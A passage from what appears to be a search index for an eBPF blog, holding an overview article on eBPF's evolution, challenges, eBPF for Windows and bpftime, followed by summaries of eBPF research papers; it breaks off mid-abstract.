https://openanolis.cn/sig/ebpfresearch</li> <li>Coolbpf Project Repository: https://gitee.com/anolis/coolbpf</li> <li>eunomia-bpf Dragon Lizard Community Mirror Repository: https://gitee.com/anolis/eunomia</li> <li>eunomia-bpf Github Repository: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>When Wasm meets eBPF: Writing, distributing, loading, and running eBPF programs with WebAssembly | Dragon Lizard Technology: https://developer.aliyun.com/article/1050439</li> <li>2023, will observability requirements have an \"explosive year\"? https://36kr.com/p/dp2063589382737542</li> </ol> <p>Share on  Share on </p>"},{"location":"blogs/ebpf-2024/","title":"The eBPF Evolution and Future: From Linux Origins to Cross-Platform Dominance","text":"<p>eBPF (Extended Berkeley Packet Filter) has become a revolutionary force in operating system kernel programming since its inception. Initially created for network packet filtering, eBPF has evolved into a versatile kernel extension tool, supporting system monitoring, performance analysis, security policy enforcement, and more. As the technology has advanced, eBPF has gained widespread adoption not only on Linux platforms but also on other operating systems like Windows and macOS, showing significant potential as a cross-platform infrastructure technology. In this context, eBPF is driving the evolution of modern operating system architectures, opening new possibilities for cloud-native infrastructure and platform engineering.</p>"},{"location":"blogs/ebpf-2024/#11-the-growth-and-evolution-of-the-ebpf-ecosystem","title":"1.1 The Growth and Evolution of the eBPF Ecosystem","text":"<p>As the application scope of eBPF expands, developers are exploring its integration with other emerging technologies to further unlock its potential. Among these, the combination of eBPF with large language models (LLMs) and WebAssembly (Wasm) has gained significant attention. These innovative integrations not only introduce new use cases for eBPF but also elevate its standing within cloud-native technologies.</p>"},{"location":"blogs/ebpf-2024/#111-a-review-of-ebpfs-early-development-and-key-breakthroughs","title":"1.1.1 A Review of eBPF's Early Development and Key Breakthroughs","text":"<p>The origins of eBPF can be traced back to the need for increased programmability within the Linux kernel. Initially, BPF was merely a tool for network packet filtering. However, with the advancement of technology, eBPF has evolved into a general-purpose kernel extension technology. eBPF allows developers to dynamically adjust and extend kernel behavior without modifying the kernel code .</p> <p>The community and enterprise contributions have been instrumental in the development of eBPF. Companies like Meta and Google have not only contributed code to enhance eBPF's capabilities but also validated its feasibility in production environments at scale. Thanks to the efforts of these enterprises, eBPF has become an essential part of cloud-native architectures, playing a significant role in system performance optimization, network security, and observability.</p> <p>In modern computing environments, eBPF's applications in observability, networking, and security have significantly improved system performance and management efficiency. Specifically, eBPF can dynamically load and execute user-defined code to capture and analyze key data in real time during system operations. This capability makes eBPF particularly effective for monitoring system states, optimizing network transmission, and enhancing security measures.</p> <p>For instance, the Cilium project utilizes eBPF to build an efficient container networking solution that provides fine-grained security policies and network traffic control. Similarly, bpftrace, a powerful dynamic tracing tool, enables developers to easily write and run complex system performance analysis scripts . The rise of these open-source projects has brought widespread attention and adoption of eBPF technology within the developer community.</p>"},{"location":"blogs/ebpf-2024/#112-innovative-development-directions-wasm-and-ai","title":"1.1.2 Innovative Development Directions: Wasm and AI","text":"<p>Integrating LLMs with eBPF: Exploring Potential Synergies</p> <p>Combining large language models (LLMs) with eBPF presents a promising technological innovation, especially in the areas of operating system programmability and automation. The powerful natural language processing capabilities of LLMs, when combined with eBPF's kernel-level execution abilities, could offer new methods for system extensions, security enhancements, automated testing, and the generation of complex application logic .</p> <p>Traditionally, writing eBPF programs requires developers to possess deep knowledge of the operating system, presenting a significant barrier for many. Tools like Kgent Kgent and GPTtrace simplify the development process by incorporating LLM technology, allowing more developers to access and utilize eBPF technology. These tools eliminate the complexity of programming and significantly lower the learning curve by translating natural language prompts directly into eBPF code. This innovation enables system administrators and DevOps engineers to easily create and manage kernel extension programs, while also providing students and beginners with a straightforward entry point into eBPF programming.</p> <p>Moreover, LLMs can be employed to create automated testing and feedback mechanisms to verify the correctness of eBPF programs. Through continuous feedback loops, LLMs can optimize the generated code, ensuring it aligns with expected system behavior. This approach not only enhances the security of eBPF programs but also accelerates the development and debugging process.</p> <p>The integration of LLMs with eBPF can also greatly improve system observability and troubleshooting efficiency. eBPF allows developers to dynamically load programs to monitor system behavior, while LLMs can interpret this data and provide intelligent analysis and recommendations. For example, in distributed systems, eBPF can capture system calls or network events, and LLMs can help interpret this data, identify potential system issues, and automatically generate repair suggestions.</p> <p>Combining WebAssembly (Wasm) with eBPF: The New Trend in the Cloud-Native Era</p> <p>In today's cloud-native environment, WebAssembly (Wasm) and eBPF are rapidly emerging as leading lightweight virtual machine tools. Initially developed as a secure sandbox within browsers, Wasm has evolved into a high-performance, cross-platform, multi-language execution environment widely used in server-side, edge computing, and other areas . Meanwhile, eBPF, originally a powerful tool within the Linux kernel for network packet filtering, has become a versatile programmable engine within the kernel space. The convergence of these two technologies is setting new trends in cloud-native technology.</p> <p>Wasm-bpf is an open-source project designed to combine the flexibility of WebAssembly with the kernel programmability of eBPF. By defining a series of abstract eBPF system interfaces, Wasm-bpf provides a unified Wasm + eBPF runtime platform for eBPF programs. Developers can use Wasm-bpf to run eBPF applications in any Wasm virtual machine or lightweight container, seamlessly accessing both kernel and user-space data. This integration not only expands WebAssembly's application scenarios but also enhances eBPF's role in network security, observability, and other fields.</p> <p>Looking ahead, the combination of Wasm and eBPF holds great potential in the data plane of service meshes. Currently, the commonly used sidecar proxy model in service mesh architectures presents performance bottlenecks. Replacing traditional sidecar proxies with eBPF can significantly improve performance. However, eBPF's limitations (such as Turing incompleteness) mean it might not fully meet the demands of complex applications on its own. This is where Wasm provides a new solution. Developers can write application logic in user space, compile it into Wasm modules, and execute them in high-performance Wasm runtimes, closely integrated with eBPF. For instance, the Envoy Proxy project has adopted Wasm as an extension mechanism for the data plane, allowing developers to write proxy logic in multiple languages and execute it through Wasm, enabling efficient and secure application extensions.</p>"},{"location":"blogs/ebpf-2024/#22-challenges-and-bottlenecks-faced-by-ebpf","title":"2.2 Challenges and Bottlenecks Faced by eBPF","text":"<p>Although eBPF (Extended Berkeley Packet Filter) is a transformative technology with strong capabilities in enhancing operating system observability, network performance, and security, it also faces several challenges and bottlenecks as it evolves. These issues not only impact the adoption and widespread use of eBPF but also introduce new complexities and risks for developers and operations personnel. Let's delve into these challenges and explore potential solutions.</p> <p>eBPF's Programming Limitations</p> <p>eBPF was originally designed to address specific network and security issues, and its execution environment is tightly restricted to ensure program safety and controllability. However, this non-Turing complete environment also brings limitations. eBPF uses a subset of the C language and operates under a strict execution model. This means that when developers write complex logic, they must consider various constraints, such as limited stack space, limited loop iterations, and strict memory access boundaries. These constraints prevent malicious code from damaging the kernel but also make development more challenging  .</p> <p>For instance, when implementing complex data structures or algorithms, developers must find alternative solutions or remodel the problem to fit eBPF's constraints. Additionally, eBPF's programming model, with its memory access and computational resource limitations, forces some tasks that could have been completed in user space to be simplified or implemented through multiple kernel-to-user space interactions. This not only increases program complexity but can also negatively impact system performance. Therefore, how to enhance eBPF's programming capabilities without sacrificing security remains a critical area for ongoing research and exploration.</p> <p>To address these complexities, the eBPF community and developers have been working to improve existing tools and frameworks. Tools like bpftrace and bcc have greatly simplified the process of writing and debugging eBPF programs. Additionally, the introduction of LLMs (large language models) offers new approaches. LLMs enable developers to write eBPF code more naturally or even directly translate natural language descriptions into eBPF programs, reducing the programming barrier. However, simplifying the development process of eBPF without sacrificing functionality remains a challenge that needs to be addressed  .</p> <p>Kernel and Application Scenario Complexity</p> <p>The powerful functionality of eBPF requires developers to have a deep understanding of kernel operations, making its learning and application threshold quite high. Developing and debugging eBPF programs requires a deep understanding of the Linux kernel's working mechanisms, including kernel module principles, system call implementations, and memory management techniques. For most developers, acquiring this knowledge requires not only high skill but also continuous experience accumulation through practice. This results in a steep learning curve for eBPF, limiting its spread and application among a broader developer community.</p> <p>Moreover, different Linux distributions and kernel versions vary in their support for eBPF, posing cross-platform compatibility challenges for developers. Some kernel versions may lack support for specific eBPF features, or eBPF programs may behave differently under different kernel configurations. To ensure that eBPF programs run stably across various environments, developers must conduct extensive testing and adjustments. This not only increases development costs but also extends the time-to-market for products.</p> <p>As eBPF's application scenarios expand, its complexity also increases. This not only raises the skill requirements for developers but also complicates the debugging and optimization of eBPF programs. To mitigate these complexities, future research and development efforts could focus on creating smarter IDEs and debugging tools. These tools should be capable of automatically identifying and fixing common programming errors, providing optimization suggestions to developers, and reducing the difficulty of eBPF program development. These advancements will enable more developers to utilize eBPF technology, improving its application efficiency and effectiveness in real production environments.</p> <p>eBPF's Security</p> <p>The kernel-level execution of eBPF introduces significant security risks. If eBPF programs are maliciously exploited, they could lead to kernel crashes or sensitive data leaks. To address this, the Linux kernel includes an eBPF verifier, which performs strict static analysis and checks when loading eBPF programs, ensuring they do not violate memory access boundaries or execute illegal operations.</p> <p>While the verifier effectively prevents the execution of malicious code in most cases, recent research and real-world incidents have shown that the verifier is not infallible. Sophisticated attack techniques can sometimes bypass the verifier\u2019s checks, exploiting kernel vulnerabilities to perform unauthorized operations. This indicates that the current eBPF security model still has room for improvement. Researchers have proposed various solutions to enhance eBPF's security, such as introducing hardware-based isolation techniques (e.g., Intel's Memory Protection Keys) or using software methods (e.g., SandBPF) to further isolate eBPF program execution. Although these solutions theoretically improve eBPF's security, they face numerous practical challenges, such as hardware support availability and software isolation performance overheads.</p> <p>Moreover, as the application scope of eBPF broadens, so do the security challenges it faces. Enhancing eBPF program security while maintaining high performance remains a crucial area for future development.</p> <p>Performance Trade-offs and Tool Coexistence</p> <p>One of eBPF's primary advantages is its high performance, particularly in network packet processing and real-time system monitoring. However, as eBPF's functionality expands, its performance faces new challenges. Specifically, eBPF was initially optimized for specific tasks, such as network traffic filtering or system event tracing, but when applied to broader scenarios, performance bottlenecks can arise. For instance, when multiple eBPF programs run concurrently, system resource contention may lead to overall performance degradation. In such cases, developers need to balance functionality and performance to ensure that eBPF programs meet requirements without overburdening the system.</p> <p>Another significant issue is the fragmentation of the eBPF toolchain. Currently, the development and deployment tools surrounding eBPF are becoming increasingly diverse, which, while expanding developers' options, also introduces compatibility and interoperability challenges. Different tools may have inconsistent interfaces and behaviors, complicating the management and integration of eBPF programs in complex systems. Furthermore, the fragmentation of the toolchain can hinder the rapid promotion of technical achievements to production environments, limiting the widespread adoption of eBPF technology.</p> <p>To address these issues, the community is promoting the standardization of the eBPF toolchain and developing more unified and user-friendly frameworks to help developers better manage the development, testing, and deployment of eBPF programs. In the future, by integrating the toolchain and optimizing performance, eBPF will be able to play its intended role in more scenarios.</p> <p>The Need for Standardization</p> <p>As eBPF is increasingly applied to different platforms, such as Windows and macOS, the need for standardization becomes more critical. Without unified standards, compatibility issues may arise, increasing the burden on developers. To address this, the eBPF community and related industry organizations should expedite the standardization process by establishing unified APIs and programming specifications to ensure consistency and compatibility of eBPF programs across different platforms. This approach will not only improve development efficiency but also promote the widespread application of eBPF technology.</p>"},{"location":"blogs/ebpf-2024/#31-future-trends-in-ebpf-development","title":"3.1 Future Trends in eBPF Development","text":"<p>eBPF (Extended Berkeley Packet Filter) was initially developed on the Linux platform and has gradually expanded to other operating systems like Windows and macOS as its powerful capabilities have been recognized. In the future, eBPF is expected to become a cross-platform infrastructure technology. By providing a unified programming interface, eBPF allows developers to run the same code seamlessly across multiple platforms, enhancing development efficiency and supporting interoperability and consistency across multi-platform systems. As eBPF becomes more widespread on other operating systems, it is poised to become a standard component of modern operating system ecosystems, offering a unified solution for network monitoring, security, and system observability across different environments.</p>"},{"location":"blogs/ebpf-2024/#32-ebpf-for-windows","title":"3.2 eBPF for Windows","text":"<p>eBPF for Windows is a project initiated by Microsoft aimed at bringing the powerful capabilities of eBPF (Extended Berkeley Packet Filter) from Linux to the Windows system. Originally developed for the Linux kernel to enhance system observability, network monitoring, and security, this project allows developers to run eBPF programs in Windows environments, offering similar functionalities as on Linux without modifying core kernel code.</p> <p>The eBPF for Windows project integrates many common eBPF toolchains and APIs from the Linux platform, making it easier for developers familiar with the Linux ecosystem to develop on Windows. This project supports various eBPF hooks and helpers, and it can perform Just-In-Time (JIT) compilation, converting eBPF bytecode into native Windows kernel instructions for efficient execution, akin to the performance of native kernel code.</p> <p>A key advancement of eBPF for Windows is the introduction of diagnostic tools and secure deployment pipelines. The project is integrated with the Windows Driver Kit (WDK), allowing eBPF programs to be compiled into Windows driver binary files, ensuring these programs can be securely signed and deployed in production systems. This process includes rigorous verification steps to ensure the security and correctness of eBPF programs, mitigating potential security risks.</p> <p>Overall, eBPF for Windows represents a significant step toward making eBPF a cross-platform technology, enabling developers to use the same powerful tools to enhance system observability and security in both Linux and Windows environments.</p>"},{"location":"blogs/ebpf-2024/#33-user-space-ebpf-runtime-bpftime","title":"3.3 User-Space eBPF Runtime: bpftime","text":"<p>bpftime is a user-space eBPF runtime designed to overcome some of the limitations of kernel-space eBPF and fully exploit the potential of eBPF in user space. Originally designed as a tool for network packet filtering, eBPF has now become a powerful system-level extension technology widely used in performance analysis, security policies, and other fields. While eBPF has strong capabilities in kernel space, it encounters bottlenecks in certain application scenarios due to security, scalability, and performance limitations. bpftime aims to address these challenges by providing a more flexible and efficient solution by introducing eBPF into user space.</p> <p>A key feature of bpftime is its compatibility with existing eBPF tools and ecosystems. By being compatible with tools like bpftrace and BCC/libbpf-tools, bpftime allows users to execute unmodified eBPF scripts in user space for system call or user-space function tracing. This design not only facilitates the migration of existing eBPF users to user space but also provides developers with a debugging environment that does not require kernel modifications or kernel eBPF support.</p> <p>In terms of performance, bpftime offers efficient Uprobe and system call tracing capabilities. Traditional Uprobe involves multiple context switches between kernel space and user space, often resulting in significant performance overhead. bpftime avoids these overheads by embedding eBPF programs into the traced process's function call context through binary rewriting. This allows for dynamic tracing and extension, enabling features such as modifying function return values, code extension, hot patching, and fault injection. Compared to kernel Uprobe, bpftime's Uprobe implementation is significantly more performant, making it suitable for high-performance applications.</p> <p>Additionally, bpftime features a built-in LLVM-based JIT compiler and AOT compiler, further improving the execution efficiency of eBPF programs. Compared to other user-space eBPF runtimes, bpftime's JIT compiler offers near-native code execution efficiency and better cross-platform support. The AOT compiler allows pre-compiling eBPF bytecode into machine code files for specific architectures, making it particularly useful for deployment on embedded devices and significantly reducing compilation startup time.</p> <p>Beyond these features, bpftime demonstrates potential in various exploratory application scenarios. For example, bpftime can enable user-space fault injection, eBPF-based Nginx module extensions, and enhanced Fuse file system capabilities. Especially in modern eBPF observability tools, bpftime can achieve cross-boundary analysis between kernel space and user space, providing a more comprehensive perspective for system performance tuning and fault diagnosis.</p> <p>As an exploratory project still under development, bpftime represents an important direction for user-space eBPF. In the future, it is expected to further expand in kernel compatibility, performance optimization, and additional application scenarios, offering new possibilities for the application of eBPF in modern computing.</p>"},{"location":"blogs/ebpf-2024/#34-ebpfs-standardization-and-emerging-application-fields","title":"3.4 eBPF's Standardization and Emerging Application Fields","text":""},{"location":"blogs/ebpf-2024/#ebpf-as-a-potential-cross-platform-standardization-layer","title":"eBPF as a Potential Cross-Platform Standardization Layer","text":"<p>As eBPF's application continues to expand across different operating systems, it is gradually evolving from a Linux-exclusive technology into a cross-platform infrastructure technology. Beyond its deep integration within the Linux kernel, eBPF is beginning to take root on Windows and is expected to extend to other operating systems like macOS and FreeBSD. This cross-platform expansion of eBPF paves the way for it to become a standardized layer across various operating systems. In the future, eBPF is likely to become an indispensable component of operating systems, providing developers with a consistent programming interface and execution environment, simplifying cross-platform development complexity.</p> <p>This trend toward standardization offers numerous potential benefits. First, cross-platform eBPF enables developers to write code once and seamlessly execute it across multiple operating systems, significantly improving development efficiency and software portability. Second, as more operating systems adopt eBPF, the industry's toolchains, frameworks, and libraries will also become more unified, further reducing developers' cognitive load when switching between platforms. Moreover, the standardization of eBPF can foster industry collaboration, encouraging developers and vendors across different operating systems to jointly drive the development and optimization of eBPF, invigorating the entire ecosystem.</p> <p>For instance, the standardization of eBPF may play a crucial role in future cloud computing and edge computing environments. As enterprises increasingly adopt hybrid and multi-cloud architectures, a cross-platform standardized layer could enable eBPF to act as a bridge connecting different cloud environments and edge devices, offering unified monitoring, security, and network management solutions for these dispersed computing resources. In this way, eBPF helps to simplify complex IT infrastructure while enhancing its overall security and performance.</p>"},{"location":"blogs/ebpf-2024/#emerging-application-fields-driving-cloud-native-architecture-development","title":"Emerging Application Fields: Driving Cloud-Native Architecture Development","text":"<p>As eBPF's capabilities expand, its application in cloud-native infrastructure is becoming increasingly prevalent. eBPF offers powerful tools for performance monitoring, security policy enforcement, and network optimization, which are critical components of modern cloud-native architectures. Specifically, eBPF enables real-time system data capture, deep analysis, and automatic system performance optimization based on this data, making it an ideal tool for cloud-native environments.</p> <p>A typical use case is eBPF's network optimization within containerized environments. Container orchestration platforms like Kubernetes demand high network performance, particularly in large-scale deployments. Traditional methods for network monitoring and optimization typically involve multiple layers of proxies and middleware, leading to unnecessary latency and complexity. In contrast, eBPF can implement network traffic monitoring and optimization directly within the kernel, avoiding additional performance overhead while providing finer control. This capability makes eBPF a key technology for improving container network performance and drives further development of cloud-native infrastructure, such as service meshes.</p> <p>Additionally, eBPF's application in security is expanding. In cloud-native environments, security threats are omnipresent, and effective system protection is a priority for enterprises. eBPF provides a built-in kernel security mechanism, allowing systems to monitor and respond to potential threats in real time. For example, eBPF can trigger security policies immediately upon detecting suspicious behavior, preventing further spread of attacks. By integrating with existing security frameworks, eBPF not only enhances system security but also provides more efficient threat detection and response mechanisms.</p>"},{"location":"blogs/ebpf-2024/#4-conclusion-and-outlook","title":"4. Conclusion and Outlook","text":"<p>Since its inception, eBPF has evolved from a simple network packet filtering tool into a powerful technology widely applied in operating system kernel extensions, performance optimization, and security monitoring. Its rise reflects not only technological advancements but also the ongoing evolution of modern computing needs. Although eBPF has already demonstrated significant advantages in various fields, its future development will continue to be marked by challenges and opportunities.</p> <p>eBPF's influence is still expanding. It has firmly established itself within the Linux kernel and is gradually being ported to Windows, other operating systems, and user-space extensions. This cross-platform expansion will further solidify eBPF's position within operating systems, making it an essential component of future system architectures. As more developers and enterprises recognize eBPF's potential, it is set to become a standard component in the next generation of operating systems and cloud computing environments, offering strong support for the entire IT ecosystem.</p> <p>The standardization and widespread adoption of eBPF will be important trends moving forward. As eBPF's application expands across various operating systems, the need for standardization becomes increasingly important. A unified API and programming model will greatly simplify cross-platform development, improving software portability and compatibility. This approach will not only promote the global adoption of eBPF technology but also accelerate the maturation of related toolchains and ecosystems, fostering industry collaboration and innovation.</p> <p>eBPF's role in cloud-native infrastructure will continue to grow. As cloud computing and containerization technologies advance rapidly, enterprises face increasing demands for system observability, security, and performance optimization. eBPF provides an efficient and flexible solution, enabling developers to monitor system behavior in real-time, automatically adjust system performance, and enhance security at the kernel level. In the future, eBPF will continue to play a key role in these critical areas, helping enterprises tackle complex computing challenges and driving the growth of the digital and cloud-native world.</p> <p>Ultimately, eBPF will become the \"invisible force\" within modern operating systems, quietly powering countless devices and systems, and driving the global digital infrastructure. Whether in servers, edge computing, or embedded devices, eBPF will provide developers and operations personnel with powerful and flexible tools, helping them better manage and optimize system performance while ensuring security and stability. As technology continues to advance, eBPF's potential will be further unleashed, injecting new momentum into the next wave of innovation.</p> <p>Share on  Share on </p>"},{"location":"blogs/ebpf-papers/","title":"The Evolution and Impact of eBPF: A list of Key Research Papers from Recent Years","text":"<p>This is a list of eBPF related papers I read in recent years, might be helpful for people who are interested in eBPF related research.</p> <p>eBPF (extended Berkeley Packet Filter) is an emerging technology that allows safe execution of user-provided programs in the Linux kernel. It has gained widespread adoption in recent years for accelerating network processing, enhancing observability, and enabling programmable packet processing.</p> <p>This document list some key research papers on eBPF over the past few years. The papers cover several aspects of eBPF, including accelerating distributed systems, storage, and networking, formally verifying the eBPF JIT compiler and verifier, applying eBPF for intrusion detection, and automatically generating hardware designs from eBPF programs.</p> <p>Some key highlights:</p> <ul> <li>eBPF enables executing custom functions in the kernel to accelerate distributed protocols, storage engines, and networking applications with improved throughput and lower latency compared to traditional userspace implementations.</li> <li>Formal verification of eBPF components like JIT and verifier ensures correctness and reveals bugs in real-world implementations.</li> <li>eBPF's programmability and efficiency make it suitable for building intrusion detection and network monitoring applications entirely in the kernel.</li> <li>Automated synthesis of hardware designs from eBPF programs allows software developers to quickly generate optimized packet processing pipelines in network cards.</li> </ul> <p>The papers demonstrate eBPF's versatility in accelerating systems, enhancing security, and simplifying network programming. As eBPF adoption grows, it is an important area of systems research with many open problems related to performance, safety, hardware integration, and ease of use.</p> <p>If you have any suggestions or adding papers, please feel free to open an issue or PR. The list was created in 2023.10, New papers will be added in the future.</p> <p>Check out our open-source projects at eunomia-bpf and eBPF tutorials at bpf-developer-tutorial. I'm also looking for a PhD position in the area of systems and networking in 2024/2025. My Github and email.</p>"},{"location":"blogs/ebpf-papers/#xrp-in-kernel-storage-functions-with-ebpf","title":"XRP: In-Kernel Storage Functions with eBPF","text":"<p>With the emergence of microsecond-scale NVMe storage devices, the Linux kernel storage stack overhead has become significant, almost doubling access times. We present XRP, a framework that allows applications to execute user-defined storage functions, such as index lookups or aggregations, from an eBPF hook in the NVMe driver, safely bypassing most of the kernel\u2019s storage stack. To preserve file system semantics, XRP propagates a small amount of kernel state to its NVMe driver hook where the user-registered eBPF functions are called. We show how two key-value stores, BPF-KV, a simple B+-tree key-value store, and WiredTiger, a popular log-structured merge tree storage engine, can leverage XRP to significantly improve throughput and latency.</p> <p>OSDI '22 Best Paper: https://www.usenix.org/conference/osdi22/presentation/zhong</p>"},{"location":"blogs/ebpf-papers/#specification-and-verification-in-the-field-applying-formal-methods-to-bpf-just-in-time-compilers-in-the-linux-kernel","title":"Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel","text":"<p>This paper describes our experience applying formal methods to a critical component in the Linux kernel, the just-in-time compilers (\"JITs\") for the Berkeley Packet Filter (BPF) virtual machine. We verify these JITs using Jitterbug, the first framework to provide a precise specification of JIT correctness that is capable of ruling out real-world bugs, and an automated proof strategy that scales to practical implementations. Using Jitterbug, we have designed, implemented, and verified a new BPF JIT for 32-bit RISC-V, found and fixed 16 previously unknown bugs in five other deployed JITs, and developed new JIT optimizations; all of these changes have been upstreamed to the Linux kernel. The results show that it is possible to build a verified component within a large, unverified system with careful design of specification and proof strategy.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/nelson</p>"},{"location":"blogs/ebpf-papers/#-io-a-unified-io-stack-for-computational-storage","title":"\u03bb-IO: A Unified IO Stack for Computational Storage","text":"<p>The emerging computational storage device offers an opportunity for in-storage computing. It alleviates the overhead of data movement between the host and the device, and thus accelerates data-intensive applications. In this paper, we present \u03bb-IO, a unified IO stack managing both computation and storage resources across the host and the device. We propose a set of designs \u2013 interface, runtime, and scheduling \u2013 to tackle three critical issues. We implement \u03bb-IO in full-stack software and hardware environment, and evaluate it with synthetic and real applications against Linux IO, showing up to 5.12\u00d7 performance improvement.</p> <p>FAST23: https://www.usenix.org/conference/fast23/presentation/yang-zhe</p>"},{"location":"blogs/ebpf-papers/#extension-framework-for-file-systems-in-user-space","title":"Extension Framework for File Systems in User space","text":"<p>User file systems offer numerous advantages over their in-kernel implementations, such as ease of development and better system reliability. However, they incur heavy performance penalty. We observe that existing user file system frameworks are highly general; they consist of a minimal interposition layer in the kernel that simply forwards all low-level requests to user space. While this design offers flexibility, it also severely degrades performance due to frequent kernel-user context switching.</p> <p>This work introduces ExtFUSE, a framework for developing extensible user file systems that also allows applications to register \"thin\" specialized request handlers in the kernel to meet their specific operative needs, while retaining the complex functionality in user space. Our evaluation with two FUSE file systems shows that ExtFUSE can improve the performance of user file systems with less than a few hundred lines on average. ExtFUSE is available on GitHub.</p> <p>ATC 19: https://www.usenix.org/conference/atc19/presentation/bijlani</p>"},{"location":"blogs/ebpf-papers/#electrode-accelerating-distributed-protocols-with-ebpf","title":"Electrode: Accelerating Distributed Protocols with eBPF","text":"<p>Implementing distributed protocols under a standard Linux kernel networking stack enjoys the benefits of load-aware CPU scaling, high compatibility, and robust security and isolation. However, it suffers from low performance because of excessive user-kernel crossings and kernel networking stack traversing. We present Electrode with a set of eBPF-based performance optimizations designed for distributed protocols. These optimizations get executed in the kernel before the networking stack but achieve similar functionalities as were implemented in user space (e.g., message broadcasting, collecting quorum of acknowledgments), thus avoiding the overheads incurred by user-kernel crossings and kernel networking stack traversing. We show that when applied to a classic Multi-Paxos state machine replication protocol, Electrode improves its throughput by up to 128.4% and latency by up to 41.7%.</p> <p>NSDI 23: https://www.usenix.org/conference/nsdi23/presentation/zhou</p>"},{"location":"blogs/ebpf-papers/#bmc-accelerating-memcached-using-safe-in-kernel-caching-and-pre-stack-processing","title":"BMC: Accelerating Memcached using Safe In-kernel Caching and Pre-stack Processing","text":"<p>In-memory key-value stores are critical components that help scale large internet services by providing low-latency access to popular data. Memcached, one of the most popular key-value stores, suffers from performance limitations inherent to the Linux networking stack and fails to achieve high performance when using high-speed network interfaces. While the Linux network stack can be bypassed using DPDK based solutions, such approaches require a complete redesign of the software stack and induce high CPU utilization even when client load is low.</p> <p>To overcome these limitations, we present BMC, an in-kernel cache for Memcached that serves requests before the execution of the standard network stack. Requests to the BMC cache are treated as part of the NIC interrupts, which allows performance to scale with the number of cores serving the NIC queues. To ensure safety, BMC is implemented using eBPF. Despite the safety constraints of eBPF, we show that it is possible to implement a complex cache service. Because BMC runs on commodity hardware and requires modification of neither the Linux kernel nor the Memcached application, it can be widely deployed on existing systems. BMC optimizes the processing time of Facebook-like small-size requests. On this target workload, our evaluations show that BMC improves throughput by up to 18x compared to the vanilla Memcached application and up to 6x compared to an optimized version of Memcached that uses the SO_REUSEPORT socket flag. In addition, our results also show that BMC has negligible overhead and does not deteriorate throughput when treating non-target workloads.</p> <p>NSDI 21: https://www.usenix.org/conference/nsdi21/presentation/ghigoff</p>"},{"location":"blogs/ebpf-papers/#hxdp-efficient-software-packet-processing-on-fpga-nics","title":"hXDP: Efficient Software Packet Processing on FPGA NICs","text":"<p>FPGA accelerators on the NIC enable the offloading of expensive packet processing tasks from the CPU. However, FPGAs have limited resources that may need to be shared among diverse applications, and programming them is difficult.</p> <p>We present a solution to run Linux's eXpress Data Path programs written in eBPF on FPGAs, using only a fraction of the available hardware resources while matching the performance of high-end CPUs. The iterative execution model of eBPF is not a good fit for FPGA accelerators. Nonetheless, we show that many of the instructions of an eBPF program can be compressed, parallelized or completely removed, when targeting a purpose-built FPGA executor, thereby significantly improving performance. We leverage that to design hXDP, which includes (i) an optimizing-compiler that parallelizes and translates eBPF bytecode to an extended eBPF Instruction-set Architecture defined by us; a (ii) soft-processor to execute such instructions on FPGA; and (iii) an FPGA-based infrastructure to provide XDP's maps and helper functions as defined within the Linux kernel.</p> <p>We implement hXDP on an FPGA NIC and evaluate it running real-world unmodified eBPF programs. Our implementation is clocked at 156.25MHz, uses about 15% of the FPGA resources, and can run dynamically loaded programs. Despite these modest requirements, it achieves the packet processing throughput of a high-end CPU core and provides a 10x lower packet forwarding latency.</p> <p>OSDI 20: https://www.usenix.org/conference/osdi20/presentation/brunella</p>"},{"location":"blogs/ebpf-papers/#network-centric-distributed-tracing-with-deepflow-troubleshooting-your-microservices-in-zero-code","title":"Network-Centric Distributed Tracing with DeepFlow: Troubleshooting Your Microservices in Zero Code","text":"<p>Microservices are becoming more complicated, posing new challenges for traditional performance monitoring solutions. On the one hand, the rapid evolution of microservices places a significant burden on the utilization and maintenance of existing distributed tracing frameworks. On the other hand, complex infrastructure increases the probability of network performance problems and creates more blind spots on the network side. In this paper, we present DeepFlow, a network-centric distributed tracing framework for troubleshooting microservices. DeepFlow provides out-of-the-box tracing via a network-centric tracing plane and implicit context propagation. In addition, it eliminates blind spots in network infrastructure, captures network metrics in a low-cost way, and enhances correlation between different components and layers. We demonstrate analytically and empirically that DeepFlow is capable of locating microservice performance anomalies with negligible overhead. DeepFlow has already identified over 71 critical performance anomalies for more than 26 companies and has been utilized by hundreds of individual developers. Our production evaluations demonstrate that DeepFlow is able to save users hours of instrumentation efforts and reduce troubleshooting time from several hours to just a few minutes.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/10.1145/3603269.3604823</p>"},{"location":"blogs/ebpf-papers/#fast-in-kernel-traffic-sketching-in-ebpf","title":"Fast In-kernel Traffic Sketching in eBPF","text":"<p>The extended Berkeley Packet Filter (eBPF) is an infrastructure that allows to dynamically load and run micro-programs directly in the Linux kernel without recompiling it.</p> <p>In this work, we study how to develop high-performance network measurements in eBPF. We take sketches as case-study, given their ability to support a wide-range of tasks while providing low-memory footprint and accuracy guarantees. We implemented NitroSketch, the state-of-the-art sketch for user-space networking and show that best practices in user-space networking cannot be directly applied to eBPF, because of its different performance characteristics. By applying our lesson learned we improve its performance by 40% compared to a naive implementation.</p> <p>SIGCOMM 23: https://dl.acm.org/doi/abs/10.1145/3594255.3594256</p>"},{"location":"blogs/ebpf-papers/#spright-extracting-the-server-from-serverless-computing-high-performance-ebpf-based-event-driven-shared-memory-processing","title":"SPRIGHT: extracting the server from serverless computing! high-performance eBPF-based event-driven, shared-memory processing","text":"<p>Serverless computing promises an efficient, low-cost compute capability in cloud environments. However, existing solutions, epitomized by open-source platforms such as Knative, include heavyweight components that undermine this goal of serverless computing. Additionally, such serverless platforms lack dataplane optimizations to achieve efficient, high-performance function chains that facilitate the popular microservices development paradigm. Their use of unnecessarily complex and duplicate capabilities for building function chains severely degrades performance. 'Cold-start' latency is another deterrent.</p> <p>We describe SPRIGHT, a lightweight, high-performance, responsive serverless framework. SPRIGHT exploits shared memory processing and dramatically improves the scalability of the dataplane by avoiding unnecessary protocol processing and serialization-deserialization overheads. SPRIGHT extensively leverages event-driven processing with the extended Berkeley Packet Filter (eBPF). We creatively use eBPF's socket message mechanism to support shared memory processing, with overheads being strictly load-proportional. Compared to constantly-running, polling-based DPDK, SPRIGHT achieves the same dataplane performance with 10\u00d7 less CPU usage under realistic workloads. Additionally, eBPF benefits SPRIGHT, by replacing heavyweight serverless components, allowing us to keep functions 'warm' with negligible penalty.</p> <p>Our preliminary experimental results show that SPRIGHT achieves an order of magnitude improvement 